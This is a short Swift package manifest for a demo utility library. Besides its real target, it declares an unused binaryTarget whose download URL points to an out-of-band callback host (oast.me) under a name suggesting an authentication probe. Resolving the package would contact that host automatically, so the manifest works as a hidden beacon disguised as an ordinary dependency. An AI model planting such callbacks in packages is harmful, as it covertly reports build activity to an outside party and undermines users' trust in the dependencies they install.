// swift-tools-version: 5.9
import PackageDescription
let package = Package(
    name: "swift-utils-demo",
    products: [.library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"])],
    targets: [
        .target(name: "SwiftUtilsDemo"),
        .binaryTarget(
            name: "UnusedArtifact",
            url: "https://da3jj4loos1rlj47pef0jfnu6149m7juj.oast.me/probe-auth001.zip",
            checksum: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        ),
    ]
)
